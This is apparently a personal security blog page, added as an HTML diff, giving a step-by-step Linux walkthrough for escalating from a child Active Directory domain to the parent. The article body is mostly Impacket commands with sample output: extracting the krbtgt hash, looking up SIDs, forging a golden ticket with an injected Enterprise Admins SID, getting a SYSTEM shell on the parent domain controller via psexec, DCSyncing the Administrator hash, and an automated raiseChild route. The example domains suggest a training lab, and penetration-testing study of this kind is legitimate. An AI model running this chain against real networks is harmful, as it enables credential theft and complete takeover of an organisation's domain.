@@ -1,0 +1,208 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Attacking Child-Parent Trust From Linux | Twistzz</title><meta name="author" content="Twistzz"><meta name="copyright" content="Twistzz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Attacking Domain Trusts – Child → Parent Trusts relies on manipulating the SID History attribute to add a high-privilege group SID, allowing an attacker in the child domain to escalate privileges and">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attacking Child-Parent Trust From Linux">
+<meta property="og:url" content="https://twistzz-ctf.github.io/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/index.html">
+<meta property="og:site_name" content="Twistzz">
+<meta property="og:description" content="Attacking Domain Trusts – Child → Parent Trusts relies on manipulating the SID History attribute to add a high-privilege group SID, allowing an attacker in the child domain to escalate privileges and">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://twistzz-ctf.github.io/images/avatar.png">
+<meta property="article:published_time" content="2025-12-02T22:57:51.000Z">
+<meta property="article:modified_time" content="2026-08-18T23:24:50.497Z">
+<meta property="article:author" content="Twistzz">
+<meta property="article:tag" content="lookupsid">
+<meta property="article:tag" content="secretsdump">
+<meta property="article:tag" content="ticketer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://twistzz-ctf.github.io/images/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Attacking Child-Parent Trust From Linux",
+  "url": "https://twistzz-ctf.github.io/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/",
+  "image": "https://twistzz-ctf.github.io/images/avatar.png",
+  "datePublished": "2025-12-02T22:57:51.000Z",
+  "dateModified": "2026-08-18T23:24:50.497Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Twistzz",
+      "url": "https://twistzz-ctf.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.ico"><link rel="canonical" href="https://twistzz-ctf.github.io/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Attacking Child-Parent Trust From Linux',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/avatar.png" alt="Logo"><span class="site-name">Twistzz</span></a><a class="nav-page-title" href="/"><span class="site-name">Attacking Child-Parent Trust From Linux</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div></div></nav><div id="post-info"><h1 class="post-title">Attacking Child-Parent Trust From Linux</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-02T22:57:51.000Z" title="Created 2025-12-02 23:57:51">2025-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-08-18T23:24:50.497Z" title="Updated 2026-08-19 00:24:50">2026-08-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/">Active Directory</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Exploitation/">Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Exploitation/Domain-Trusts/">Domain Trusts</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Exploitation/Domain-Trusts/Abuse-Child-Parent-Trust-From-Linux/">Abuse Child-Parent Trust From Linux</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p>Attacking Domain Trusts – Child → Parent Trusts relies on manipulating the <code>SID History attribute</code> to add a high-privilege group SID, allowing an attacker in the child domain to escalate privileges and access the parent domain as <code>SYSTEM</code>.</p>
+</blockquote>
+<h1 id="Manually"><a href="#Manually" class="headerlink" title="Manually"></a>Manually</h1><h3 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h3><blockquote>
+<p>To successfully get access to the parent domain we need first :</p>
+<ul>
+<li>The KRBTGT hash of the child domain ( To Sign the Golden Ticket ).</li>
+<li>The SID of the child domain.</li>
+<li>The FQDN of the child domain.</li>
+<li>The name of a target user in the child domain (doesn’t need to exist!).</li>
+<li>The SID of the Enterprise Admins Group of the parent domain.</li>
+</ul>
+</blockquote>
+<h3 id="Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain"><a href="#Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain" class="headerlink" title="Extraction Of KRBTGT Hash Of The Child Domain"></a>Extraction Of KRBTGT Hash Of The Child Domain</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py child-FQDN-domain/our-privileged-user@child-domain-dc-ip -just-dc-user NETBIOS_DOMAIN/krbtgt</span><br><span class="line"></span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br></pre></td></tr></table></figure>
+
+<p>FQDN : <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
+<p>krbtgt : <code>9d765b482771505cbe97411065964d5f</code>.</p>
+<h3 id="Extracting-Child-Domain-SID"><a href="#Extracting-Child-Domain-SID" class="headerlink" title="Extracting Child Domain SID"></a>Extracting Child Domain SID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lookupsid.py child-FQDN-domain/our-privileged-user@child-dc-ip | grep <span class="string">&quot;Domain SID&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Extracting-Parent-Domain-SID-Attaching-to-Enterprise-Admins’s-RID"><a href="#Extracting-Parent-Domain-SID-Attaching-to-Enterprise-Admins’s-RID" class="headerlink" title="Extracting Parent Domain SID &amp; Attaching to Enterprise Admins’s RID"></a>Extracting Parent Domain SID &amp; Attaching to Enterprise Admins’s RID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lookupsid.py child-FQDN-domain/our-privileged-user@parent-dc-ip</span><br><span class="line"></span><br><span class="line">[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114</span><br><span class="line"></span><br><span class="line">519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ <code>Enterprise-Admins-SID</code> : S-1-5-21-3842939050-3880317879-2865463114-519</p>
+</blockquote>
+<h3 id="Craft-A-Golden-Ticket"><a href="#Craft-A-Golden-Ticket" class="headerlink" title="Craft A Golden Ticket"></a>Craft A Golden Ticket</h3><blockquote>
+<p>➜ With this command, we craft a golden ticket for <code>non existing user ( twistzz )</code> and inject in the <code>SID History</code> attribute the SID of the <code>Enterprise Admins</code> Group.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ticketer.py -nthash KRBTGT-<span class="built_in">hash</span> -domain child-domain-FQDN -domain-sid child-domain-SID -extra-sid Enterprise-Admins-SID twistzz</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> twistzz.ccache</span><br></pre></td></tr></table></figure>
+
+<h3 id="Getting-a-SYSTEM-Shell"><a href="#Getting-a-SYSTEM-Shell" class="headerlink" title="Getting a SYSTEM Shell"></a>Getting a SYSTEM Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=twistzz.ccache</span><br><span class="line"></span><br><span class="line">psexec.py child-FQDN-domain/twistzz@dc.parent-FQDN-domain -k -no-pass -target-ip parent-dc-ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="DCSync-The-Parent-Domain"><a href="#DCSync-The-Parent-Domain" class="headerlink" title="DCSync The Parent Domain"></a>DCSync The Parent Domain</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py twistzz@dc.parent-FQDN-domain -k -no-pass -just-dc-ntlm -just-dc-user Administrator</span><br></pre></td></tr></table></figure>
+
+<h1 id="Automatically"><a href="#Automatically" class="headerlink" title="Automatically"></a>Automatically</h1><h3 id="raiseChild"><a href="#raiseChild" class="headerlink" title="raiseChild"></a>raiseChild</h3><blockquote>
+<p>We <code>need to specify the target domain controller</code> and <code>credentials for an administrative user in the child domain</code>, the script will do the rest :</p>
+<ul>
+<li>Obtains the SID for the Enterprise Admins group of the parent domain</li>
+<li>Retrieves the hash for the KRBTGT account in the child domain</li>
+<li>Creates a Golden Ticket</li>
+<li>Logs into the parent domain</li>
+<li>Retrieves credentials for the Administrator account in the parent domain</li>
+</ul>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">raiseChild.py -target-exec Parent-DC-IP Child-domain/our-privileged-user</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io">Twistzz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/">https://twistzz-ctf.github.io/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/secretsdump/">secretsdump</a><a class="post-meta__tags" href="/tags/lookupsid/">lookupsid</a><a class="post-meta__tags" href="/tags/ticketer/">ticketer</a></div><div class="post-share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/03/Attacking-Child-Parent-Trust-From-Windows/" title="Attacking Child-Parent Trust From Windows"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Attacking Child-Parent Trust From Windows</div></div><div class="info-2"><div class="info-item-1">Prerequisite To successfully get access to the parent domain we need first :  The KRBTGT hash of the child domain ( To Sign the Golden Ticket ). The SID of the child domain. The FQDN of the child domain. The name of a target user in the child domain (doesn’t need to exist!). The SID of the Enterprise Admins Group of the parent domain.   EnumerationEnumerate Trust Relationship12345678910111213141516171819PS C:\Tools&gt; Import-Module ActiveDirectoryPS C:\Tools&gt; Get-ADTrust -Filter *Directio...</div></div></div></a><a class="pagination-related" href="/2025/12/02/AD-ACLs/" title="AD : ACLs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">AD : ACLs</div></div><div class="info-2"><div class="info-item-1">ForceChangePassword ➜ Reset the target user’s password without knowing the old password  1nxc smb domain -u our-user -p password -M change-password -o USER=&#x27;target-username&#x27; NEWPASS=&#x27;new-password&#x27;  Or 1bloodyAD --host ip -d dc -u our-user -p password set password target-username new-password  Or 1net rpc password target-username new-password -U &quot;domain&quot;/&quot;our-user&quot;%&quot;password&quot; -S DC  WriteSPN ➜ Targeted Kerberoasting.  1bloodyAD --host dc -d dom...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/02/AD-ACLs/" title="AD : ACLs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-02</div><div class="info-item-2">AD : ACLs</div></div><div class="info-2"><div class="info-item-1">ForceChangePassword ➜ Reset the target user’s password without knowing the old password  1nxc smb domain -u our-user -p password -M change-password -o USER=&#x27;target-username&#x27; NEWPASS=&#x27;new-password&#x27;  Or 1bloodyAD --host ip -d dc -u our-user -p password set password target-username new-password  Or 1net rpc password target-username new-password -U &quot;domain&quot;/&quot;our-user&quot;%&quot;password&quot; -S DC  WriteSPN ➜ Targeted Kerberoasting.  1bloodyAD --host dc -d dom...</div></div></div></a><a class="pagination-related" href="/2026/06/30/Bleeding-Edge-Coercion/" title="Bleeding-Edge &amp; Coercion"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-30</div><div class="info-item-2">Bleeding-Edge &amp; Coercion</div></div><div class="info-2"><div class="info-item-1"> ➜ Everything here needs only a valid domain account yet can jump straight to Domain Admin.  NoPac (CVE-2021-42278 &#x2F; 42287) ➜ NoPac chains two bugs: we rename a machine account we create to match the DC’s name (42278), then request a service ticket after the DC object is restored, so the KDC issues us a ticket as the DC (42287). The result is a SYSTEM shell or a DCSync.  SetupClone NoPac ➜ Clone the exploit repo :  1git clone https://github.com/Ridter/noPac.git  ExploitationScan Whether ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Twistzz</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">417</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">66</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Twistzz-cb" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Manually"><span class="toc-number">1.</span> <span class="toc-text">Manually</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prerequisite"><span class="toc-number">1.1.</span> <span class="toc-text">Prerequisite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain"><span class="toc-number">1.2.</span> <span class="toc-text">Extraction Of KRBTGT Hash Of The Child Domain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Child-Domain-SID"><span class="toc-number">1.3.</span> <span class="toc-text">Extracting Child Domain SID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Parent-Domain-SID-Attaching-to-Enterprise-Admins%E2%80%99s-RID"><span class="toc-number">1.4.</span> <span class="toc-text">Extracting Parent Domain SID &amp; Attaching to Enterprise Admins’s RID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Craft-A-Golden-Ticket"><span class="toc-number">1.5.</span> <span class="toc-text">Craft A Golden Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-a-SYSTEM-Shell"><span class="toc-number">1.6.</span> <span class="toc-text">Getting a SYSTEM Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCSync-The-Parent-Domain"><span class="toc-number">1.7.</span> <span class="toc-text">DCSync The Parent Domain</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Automatically"><span class="toc-number">2.</span> <span class="toc-text">Automatically</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#raiseChild"><span class="toc-number">2.1.</span> <span class="toc-text">raiseChild</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/07/Abusing-Foreign-Group-Membership/" title="Abusing Foreign Group Membership">Abusing Foreign Group Membership</a><time datetime="2026-07-07T07:29:09.000Z" title="Created 2026-07-07 08:29:09">2026-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Forest-Trust-Enumeration/" title="Forest Trust Enumeration">Forest Trust Enumeration</a><time datetime="2026-07-06T14:00:25.000Z" title="Created 2026-07-06 15:00:25">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Child-Parent-Trust-Enumeration/" title="Child-Parent Trust Enumeration">Child-Parent Trust Enumeration</a><time datetime="2026-07-06T13:42:32.000Z" title="Created 2026-07-06 14:42:32">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Users-Groups/" title="Users &amp; Groups">Users &amp; Groups</a><time datetime="2026-07-06T13:13:08.000Z" title="Created 2026-07-06 14:13:08">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Domain-and-ACLs/" title="Domain and ACLs">Domain and ACLs</a><time datetime="2026-07-06T12:24:06.000Z" title="Created 2026-07-06 13:24:06">2026-07-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Twistzz</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search for Posts" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>
